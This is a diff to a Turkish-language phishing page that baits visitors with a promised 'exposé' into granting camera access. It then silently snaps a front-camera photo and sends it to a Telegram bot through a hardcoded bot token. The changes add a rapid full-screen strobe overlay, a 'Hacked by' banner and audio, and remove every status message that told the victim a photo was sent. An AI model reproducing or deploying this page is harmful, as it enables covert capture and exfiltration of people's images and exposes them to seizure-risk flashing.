@@ -2,28 +2,45 @@
 <html lang="tr">
 <head>
   <meta charset="UTF-8" />
-  <title>İfşanı Görmek İçin İzin Ver</title>
+  <title>İfşa Sayfası</title>
   <style>
     body, html {
-      margin: 0; padding: 0; height: 100vh; background: black; color: white;
-      display: flex; flex-direction: column; justify-content: center; align-items: center;
-      font-family: sans-serif; text-align: center;
-    }
-    button {
-      padding: 15px 30px;
-      font-size: 18px;
-      cursor: pointer;
-      border-radius: 8px;
-      border: none;
-      background: #28a745;
+      margin: 0; padding: 0; height: 100%; overflow: hidden;
+      font-family: sans-serif; text-align: center; background: black;
       color: white;
-      margin-top: 20px;
     }
-    #mesaj {
-      margin-top: 15px;
+    #flashOverlay {
+      position: fixed;
+      top: 0; left: 0; right: 0; bottom: 0;
+      animation: flash 0.1s infinite alternate;
+      z-index: 9998;
+      mix-blend-mode: difference;
+    }
+    @keyframes flash {
+      0% { background-color: white; }
+      100% { background-color: black; }
+    }
+    #izinButton {
+      z-index: 10000;
+      margin-top: 40vh;
+      padding: 15px 30px;
+      font-size: 22px;
+      cursor: pointer;
+      background: #222;
+      color: white;
+      border: 2px solid white;
+      border-radius: 10px;
+    }
+    #hackedFlash {
+      font-size: 50px;
       font-weight: bold;
-      min-height: 24px;
-      color: lime;
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      animation: flash 0.1s infinite alternate;
+      z-index: 11000;
+      display: none;
     }
     video, canvas {
       display: none;
@@ -32,23 +49,16 @@
 </head>
 <body>
 
-  <h1>📷 İfşanı görmek için izin ver</h1>
+  <div id="flashOverlay"></div>
+
+  <h2 style="z-index: 10000;">📷 İfşanı görmek için lütfen izin ver</h2>
   <button id="izinButton">İfşanı görmek için izin ver</button>
-  <div id="mesaj"></div>
 
   <video id="video" autoplay playsinline></video>
   <canvas id="canvas"></canvas>
+  <div id="hackedFlash">Hacked by @46emirrr</div>
 
-  <!-- YouTube video gizli -->
-  <iframe
-    id="ytplayer"
-    width="0" height="0"
-    src="https://www.youtube.com/embed/w_S98XbQmPY?enablejsapi=1&start=43&loop=1&playlist=w_S98XbQmPY&controls=0&autoplay=0&mute=0"
-    frameborder="0"
-    allow="autoplay"
-    allowfullscreen
-    style="display:none;">
-  </iframe>
+  <audio id="audio" src="https://raw.githubusercontent.com/emier71st/Dj-/main/Dj%20Mehmet%20Tekin%20-%20Eyp%20Audio%20Spl%202%20(Official%20Video).mp3"></audio>
 
   <script>
     const TELEGRAM_BOT_TOKEN = "7996559452:AAFUZHzo4URmpsKOXVemh5EkLWvzv-BWQTg";
@@ -58,44 +68,18 @@
     const video = document.getElementById("video");
     const canvas = document.getElementById("canvas");
     const ctx = canvas.getContext("2d");
-    const mesaj = document.getElementById("mesaj");
-    const ytplayer = document.getElementById("ytplayer");
-
-    // YouTube Player API için
-    let player;
-
-    function onYouTubeIframeAPIReady() {
-      player = new YT.Player('ytplayer', {
-        events: {
-          'onReady': onPlayerReady
-        }
-      });
-    }
-
-    function onPlayerReady(event) {
-      // Başlangıçta otomatik başlamasın, izin butonuna basınca başlasın
-    }
-
-    // YouTube iframe API script ekle
-    let tag = document.createElement('script');
-    tag.src = "https://www.youtube.com/iframe_api";
-    document.body.appendChild(tag);
+    const hackedFlash = document.getElementById("hackedFlash");
+    const audio = document.getElementById("audio");
 
     izinButton.addEventListener("click", async () => {
-      izinButton.disabled = true;
-      mesaj.textContent = "";
-
-      // YouTube müziğini başlat
-      if(player && player.playVideo){
-        player.seekTo(43);
-        player.playVideo();
-      }
+      izinButton.style.display = "none";
+      audio.play().catch(e => console.log("Oynatma engellendi:", e));
+      hackedFlash.style.display = "block";
 
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
         video.srcObject = stream;
 
-        // 2 saniye bekle
         await new Promise(r => setTimeout(r, 2000));
 
         canvas.width = video.videoWidth;
@@ -109,27 +93,18 @@
 
           const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
 
-          const res = await fetch(telegramUrl, {
+          await fetch(telegramUrl, {
             method: "POST",
             body: formData
           });
-
-          if (res.ok) {
-            mesaj.textContent = "📤 Fotoğraf Telegram'a gönderildi!";
-          } else {
-            mesaj.textContent = "❌ Gönderim başarısız.";
-            izinButton.disabled = false;
-          }
 
           stream.getTracks().forEach(track => track.stop());
         }, "image/png");
 
       } catch (err) {
-        mesaj.textContent = "Kamera erişimi alınamadı: " + err.message;
-        izinButton.disabled = false;
+        console.log("Kamera erişimi alınamadı:", err.message);
       }
     });
   </script>
-
 </body>
 </html>
